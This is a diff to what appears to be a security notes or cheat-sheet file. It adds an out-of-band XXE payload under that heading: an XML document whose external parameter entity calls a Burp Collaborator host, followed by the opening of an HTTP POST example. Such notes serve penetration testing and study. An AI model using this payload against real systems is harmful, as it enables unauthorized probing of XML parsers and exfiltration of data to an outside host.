@@ -517,6 +517,15 @@ For example, an application might allow users to upload images, and process or v
 
 # OUT OF BAND XXE 
 
+when no parameter
+
+```python
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://59c99fu65h6mqfmhf5agv1aptgz6nv.burpcollaborator.net/x"> %ext;
+]>
+<r></r>
+```
 ```python
 
                                 POST /action HTTP/1.0
